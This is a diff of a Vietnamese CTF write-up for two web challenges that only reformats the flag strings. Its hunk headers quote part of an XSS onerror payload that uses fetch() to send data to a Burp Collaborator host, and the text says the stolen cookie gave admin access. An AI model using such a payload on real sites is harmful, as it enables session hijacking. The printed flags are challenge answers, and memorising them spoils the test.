@@ -172,7 +172,7 @@ onerror+="fetch('http://zhkkvmum0fax47nsznozle8vsmyfm4.burpcollaborator.net/',+{
   * Cuối cùng lấy cookie đó login tôi đã vào được acc **admin**
   ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic3.jpg?raw=true)
   
-**Flag**: ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}
+**Flag**: `ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}`
 
 # Web: Web2
 
@@ -216,4 +216,4 @@ onerror+="fetch('http://zhkkvmum0fax47nsznozle8vsmyfm4.burpcollaborator.net/',+{
   
   ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic7.jpg?raw=true)
   
-**Flag**: ATTT{4_51mpl3_r3v_5ql}
+**Flag**: `ATTT{4_51mpl3_r3v_5ql}`
